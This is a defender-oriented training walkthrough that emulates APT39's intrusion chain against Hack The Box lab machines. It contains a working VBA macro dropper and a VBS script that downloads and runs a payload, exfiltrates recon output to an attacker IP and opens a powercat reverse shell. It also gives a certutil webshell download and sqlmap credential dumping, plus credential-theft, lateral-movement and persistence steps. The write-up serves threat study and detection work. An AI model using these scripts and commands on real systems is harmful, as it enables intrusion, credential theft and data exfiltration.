# Emulating A Threat Actor - APT 39

As defenders, we acquire tactical advantages by learning and studying how the adversary behaves. We use this knowledge to develop the most effective methods for detection and response when they are used in our environment.

In this training document we will take a closer look at one actor and
emulate their methodologies in a lab environment to help us better:

- Identify and counter use of offensive techniques
- Evaluate the success and impact of adversary actions
- Explain logic and intent of adversary actions and decisions

<br>

[APT 39](https://www.fireeye.com/blog/threat-research/2019/01/apt39-iranian-cyber-espionage-group-focused-on-personal-information.html) was identified by FireEye in December 2018. FireEye gives us a summary of their observed behaviors [here](https://www.fireeye.com/blog/threat-research/2019/01/apt39-iranian-cyber-espionage-group-focused-on-personal-information.html):

![](https://www.fireeye.com/content/dam/fireeye-www/blog/images/APT39/APT39Fig2.png)<br><br>

Let's look at each one:

- [Initial Compromise](#initial-compromise)
  - [Legitimate Creds > OWA](#legitimate-creds->-owa)
  - [Spearphishing > POWBAT](#spearphishing->-powbat)
  - [Webapp Vuln > Webshell](#webapp-vuln->-webshell)
- [Establish Foothold](#establish-foothold)
  - [RCE Improvement](#rce-Improvement)
  - [User Driven](#user-driven)
- [Escalate Privileges](#escalate-privileges)
  - [M1m1katz](#m1m1katz)
  - [Windows Credential Editor](#windows-credential-editor)
  - [ProcDump](#procdump)
- [Internal Reconnaissance](#internal-reconnaissance)
  - [Port Scanning](#port-scanning)
  - [SOCKS5 Proxies](#socks5-proxies)
- [Move Laterally](#move-laterally)
  - [RDP](#rdp)
  - [PSEXEC](#psexec)
  - [SMB](#smb)
  - [SSH](#ssh)
  - [Named Pipes](#named-pipes)
- [Maintain Presence](#maintain-presence)
  - [LNK Shortcuts](#lnk-shortcuts)
  - [Scheduled Tasks](#scheduled-tasks)
  - [Startup Folder](#startup-folder)

<br>

## Initial Compromise

- [Legitimate Creds > OWA](#legitimate-creds->-owa)
- [Spearphishing > POWBAT](#spearphishing->-powbat)
- [Webapp Vuln > Webshell](#webapp-vuln->-webshell)


### Legitimate Creds > OWA

> "Used stolen legitimate credentials to compromise externally facing Outlook Web Access (OWA) resources"

<br>

The HTB box called **Rabbit** is a good example to demonstrate this.  During initial
reconnaissance, a dictionary attack on directories reveals an [Outlook Web Access]() portal:

```
wfuzz -c -w /usr/share/dirb/wordlists/big.txt --hs 403 http://rabbit.htb/FUZZ
```

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image002.png)<br><br>

Further recon reveals a SQLI flaw on the complain portal:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image006.png)<br><br>

Exploiting this vulnerability allows dumping credentials with a tool like [sqlmap]():

```
sqlmap -r rabbit.req --dbms=mysql -p "compId" --risk=3 --level=3 --batch -D secret --dump
```

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image003.png)<br><br>

These credentials can be used to login to the OWA portal:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image004.png)<br><br>

Upon logging in there are now opportunities to send a phishing email from the
compromised account:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image005.png)<br><br>


### Spearphishing > POWBAT

> "FireEye Intelligence has observed APT39 leverage spear phishing emails with malicious attachments and/or hyperlinks typically resulting in a POWBAT infection"

<br>

Now that we have access to OWA, we can simulate a spearphishing email.  Only
difference is we'll be sending it from a legitimate account.

Analysis of a POWBAT variant can be found [here](https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.html).  To simulate this malicious document, we'll create a
macro that performs some of its basic functions:

- Drops `update.vbs` in `C:\Users\Public`
- Creates `GoogleUpdateTaskMachineUI` task which runs `update.vbs` every 3 minutes

<br>

Here is a basic VBA macro that does this:

```vbs
Sub Init()
   Set wss = CreateObject("WScript.Shell")
   Set cmd = "powershell.exe Invoke-WebRequest -Uri http://10.10.14.53:8443/update.vbs -OutFile C:\Users\Public\update.vbs"
   CreateObject("WScript.Shell").Run cmd, 0
   wss.Run "schtasks /create /F /sc minute /mo 3 /tn GoogleUpdateTaskMachineUI /tr C:\Users\Public\update.vbs", 0
End Sub
```
<br>

Here is the `update.vbs` file we'll use which does the following:

- Downloads a BAT file and saves it in `C:\Users\Public\run.bat`
- Executes the BAT file and stores the results in `C:\Users\Public\up`.
- Uploads this file to the attacking machine via HTTP POST request
- Executes the PowerShell utility tool `powercat.ps1`

```vbs
HOME="C:\Users\Public\"
SERVER="http://10.10.14.53:"

RunBat="powershell -version 2 ""&{$wc=(new-object System.Net.WebClient);$wc.DownloadFile('"&SERVER&"8443/run.bat','"&HOME&"run.bat');iex ('"&HOME&"run.bat >"&HOME&"up')}"""
Upload="powershell ""&{iwr -Uri '"&SERVER&"8888/up' -Method Post -InFile '"&HOME&"up' -UseDefaultCredentials | Out-Null}"""
RunCat="powershell -version 2 ""&{iex (new-object System.Net.WebClient).DownloadString('"&SERVER&"8443/powercat.ps1');powercat -c 10.10.14.53 -p 443 -e cmd}"""

CreateObject("WScript.Shell").Run RunBat, 0
CreateObject("WScript.Shell").Run Upload, 0
CreateObject("WScript.Shell").Run RunCat, 0
```

<br>

And here is the `.bat` file which gathers information from the victim host:

```cmd
whoami & hostname & ipconfig /all & net user /domain 2>&1 & net group /domain 2>&1 & net group "domain admins" /domain 2>&1 & net group "Exchange Trusted Subsystem" /domain 2>&1 & net accounts /domain 2>&1 & net user 2>&1 & net localgroup administrators 2>&1 & netstat -an 2>&1 & tasklist 2>&1 & sc query 2>&1 & systeminfo 2>&1 & reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" 2>&1
```

<br>

To perform this attack, create a document in OpenOffice with the macro:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image000.png)<br><br>

Now set up listeners on the attacking machine:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image191.png)<br><br>

And send the email:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image009.png)<br><br>

When the document is opened, the files are downloaded and executed, and we are
given a low privileged shell:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image192.png)<br><br>

And we have the output of the `run.bat` file containing all the information
gathered from the victim machine:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image193.png)<br><br>


### Webapp Vuln > Webshell

> "This group has routinely identified and exploited vulnerable web servers of targeted organizations to install web shells, such as ANTAK and ASPXSPY"

<br>

**Bounty** is a machine hosting an IIS website.  Searching for interesting paths
with [dirsearch.py]() reveals a `transfer.aspx` page:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image007.png)<br><br>

This page allows file uploads, but it won't allow you to upload a webshell:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image008.png)<br><br>


This version of IIS does allow a `web.config` file to be uploaded that will execute
arbitrary commands.  This can be used to execute a command that downloads the
`antak.aspx` web page to the IIS `wwwroot` directory:

```
certutil -urlcache -split -f http://10.10.14.53/antak.aspx C:\inetpub\wwwroot\antak.aspx
```

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image010.png)<br><br>

After the `uploadedfiles/web.config` page is visited, the command is executed
making the webshell available for use:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image011.png)<br><br>

This webshell provides a PowerShell prompt and also allows provides other
capabilities such as uploading/downloading files:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image012.png)<br><br>

Standard web logs only show file paths of the pages being requested:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image013.png)<br><br>


## Establish Foothold

> "APT39 leverages custom backdoors such as SEAWEED and CACHEMONEY to establish a foothold in a target environment"

<br>

Once the actor has command execution on a victim host that appears to be a high
value target, a more capable backdoor can be installed:

|||
|-|-|
|SEAWEED (Remexi)|DLL providing reverse shell over HTTP|
|CACHEMONEY (WinDollar)|DLL providing keystroke logging, screen captures, and command execution over RC4-encrypted HTTP|

<br>

- [RCE Improvement](#rce-Improvement)
- [User Driven](#user-driven)

### RCE Improvement

Remote execution on the HTB box named **Blue** can be quickly obtained using
Metasploit's Eternal Blue module.  This code execution can now be used to
deploy an implant with post-exploitation modules.

[Cobalt Strike Beacon](https://www.cobaltstrike.com/help-beacon) is a DLL that
has all of these capabilities and more so we'll use it to simulate.

We'll create a PowerShell cradle using the **Scripted Web Delivery** option:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image100.png)<br><br>

Copy, paste, and run it on the victim host:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image101.png)<br><br>

The beacon is now communicating to the C2 server using encrypted HTTP:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image102.png)<br><br>


[Meterpreter](https://github.com/rapid7/metasploit-payloads) is another backdoor
we can use to simulate.  The **Helpline** box hosts a help desk portal having
two vulnerabilities,
([EDB-35891](https://www.exploit-db.com/exploits/35891) and
[EDB-42037](https://www.exploit-db.com/exploits/42037)) that can be used to
gain access to the application:

With this access, you can use a trigger to obtain code execution on the server
which we'll use to download and run a `nc.exe` backdoor:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image014.png)<br><br>

The application happens to be running the backdoor as SYSTEM:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image015.png)<br><br>

The next step would be to download a more capable backdoor like
[meterpreter](https://github.com/rapid7/metasploit-payloads):

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image016.png)<br><br>


Again, deploying [Empire](https://github.com/EmpireProject/Empire) to the box
named **Chatterbox**, a simple download
and execute will deploy the agent in memory:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image103.png)<br><br>

The agent reports back ready to execute commands:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image104.png)<br><br>

Here is another one-liner installing an implant.  This implant, a Koadic C2
"zombie",  is downloaded and installed with one command :

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image020.png)<br><br>

Once a post-exploitation agent is running, escalating privileges and performing
internal reconnaissance can be performed quickly and easily.

The [Invoke-AllChecks](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) script quickly reveals stored credentials stored on **Chatterbox**:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image105.png)<br><br>

### User Driven

Or an implant can be deployed with a user driven attack such as a phishing
document.  In **Reel**, an email address can be discovered and used to deploy
Meterpreter directly from an RTF document.

Metasploit's `/windows/fileformat/office_word_hta` module will create the RTF file which downloads
and executes an HTA when opened.  

This command sends the email with the created attachment:

```
swaks -s "10.10.10.77" -p "25" -t "nico@megabank.com" -f "charlie@megabank.com" --header "Subject: open" --body "hi there" --attach /root/.msf4/local/report.doc
```

<br>

When it is opened, the document downloads the HTA and runs the command it
contains which executes a meterpreter reverse shell:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image080.png)<br><br>


## Escalate Privileges

> "During privilege escalation, freely available tools such as M1m1katz,
 Windows Credential Editor, and ProcDump"

<br>

Most implants have a way to dump hashes similar to the `hashdump` module in meterpreter:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image017.png)<br><br>

Another option is downloading one of the credential-stealing programs below:


- [M1m1katz](#m1m1katz)
- [Windows Credential Editor](#windows-credential-editor)
- [ProcDump](#procdump)

<br>

### M1m1katz

[M1m1katz](https://attack.mitre.org/software/S0002/) has multiple ways to extract
credentials from a Windows host---this is the `sekurlsa::logonpasswords` module:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image081.png)<br><br>

Many post-exploitation tools have built-in modules that use M1m1katz functions.  Here Cobalt Strike Beacon executes M1m1katz's `wdigest` module to reveal credentials:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image110.png)<br><br>


### Windows Credential Editor

[Windows Credential Editor](https://attack.mitre.org/software/S0005/) is another
windows program that can be downloaded to the victim host and used to extract
various credentials:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image082.png)<br><br>

The `-w` option returns the cleartext passwords:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image083.png)<br><br>

### ProcDump

[ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is
a program from the SysInternals suite that can used to dump a process's memory
which frequently contains credentials.  Here, the program is uploaded to the
**Heist** box and used to create a dump file which can be searched for credentials:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image018.png)<br><br>

These creds can be used to log in to the box as the `Administrator` account:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image019.png)<br><br>


## Internal Reconnaissance

> "Internal reconnaissance has been performed using custom scripts custom tools
such as the port scanner BLUETORCH. Custom tools such as REDTRIP, PINKTRIP, and
BLUETRIP have also been used to create SOCKS5 proxies between infected hosts"

<br>

- [Port Scanning](#port-scanning)
- [SOCKS5 Proxies](#socks5-proxies)


### Port Scanning

Several post-exploitation tools have built in modules to identify neighboring
hosts on the network.  Here is Empire's `arpscan` module using the victim host
to scan the local network:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image084.png)<br><br>

Here another implant [Kodiac C2]() is seen scanning ports on other internal hosts:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image022.png)<br><br>

### SOCKS5 Proxies

Many tools such as Metasploit allow running SOCKS proxies on the victim host:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image086.png)<br><br>

This allows an implant to scan another host on the local network from the
victim host:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image087.png)<br><br>


## Move Laterally

> "APT39 facilitates lateral movement through myriad tools such as Remote
Desktop Protocol (RDP), Secure Shell (SSH), PsExec, RemCom, and xCmdSvc"

<br>

Let's look at ways we can simulate APT 39's methods for moving laterally:

- [RDP](#rdp)
- [PSEXEC](#psexec)
- [SMB](#smb)
- [SSH](#ssh)
- [Named Pipes](#named-pipes)

<br>

### RDP   

In this example, a beacon is running on `DUSTOFF/192.168.1.117` and a neighboring
host `192.168.1.132` has the Remote Desktop service running:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image114.png)<br><br>

A socks server is started on the attacking machine that is mapped to the beacon
on the victim host.  Then `proxychains` is configured to use it:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image116.png)<br><br>

Now we can use RDP client `xfreerdp` to tunnel through the beacon on `DUSTOFF`
and access `192.168.1.132`.  Notice `netstat` shows the RDP connection is coming
from `192.168.1.117/DUSTOFF`:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image115.png)<br><br>

### PSEXEC

Impacket's `psexec.py` script simulates `psexec.exe` from the attacking machine:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image093.png)<br><br>

But by creating a route in the implant, an attacker can perform the same action
but this time coming from the victim system:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image092.png)<br><br>

### SMB

Here the same technique is being used to access a second machine's SMB share
from the victim host:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image091.png)<br><br>

### SSH

Beacon has a `ssh` command that can be used for lateral movement.  Give it the
host you want to SSH to, username, and password, and it will use the beacon
to tunnel an SSH connection to the host:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image112.png)<br><br>

Cobalt Strike's session graph view shows we have SSH access to `serverone` by
pivoting through the beacon on `DUSTOFF`:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image111.png)<br><br>

And can execute commands on the new victim host:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image113.png)<br><br>

Here is another way to tunnel SSH through the Meterpreter using `route` command:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image090.png)<br><br>


### Named Pipes

[xCmdSvc]() is used to communicate with the a victim system using named pipes.  
Cobalt Strike Beacon also has this capability so we'll use it to demonstrate.

The comprimised account we're using has administrative access on a remote system:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image119.png)<br><br>

The `psexec_psh` command uses the account's token to start a service on a remote host
which spins up a beacon.  Here we specify the SMB beacon that communicates
using named pipes:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image118.png)<br><br>

Cobalt Strike shows us the new system which we are also reaching via a pivot
through `DUSTOFF`:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image117.png)<br><br>

## Maintain Presence

Here are some ways APT 39 has persisted on a victim machine:

- [LNK Shortcuts](#lnk-shortcuts)
- [Scheduled Tasks](#scheduled-tasks)
- [Startup Folder](#startup-folder)

<br>

### LNK Shortcuts

Shortcut (LNK) files have been used in many types of malware, especially for social
engineering attacks.  They can be clicked by a user or placed in various
locations to execute automatically.

This one was created with Empire and runs an encoded PowerShell command when executed:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image088.png)<br><br>

### Scheduled Tasks

Here two commands are used to download the LNK file and run it as a scheduled task
every hour for persistence:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image085.png)<br><br>

### Startup Folder

Another common technique is to place a file in a user's Startup folder so that
it will execute upon logon:

![](images/Emulating%20A%20Threat%20Actor%20-%20APT%2039/image089.png)<br><br>
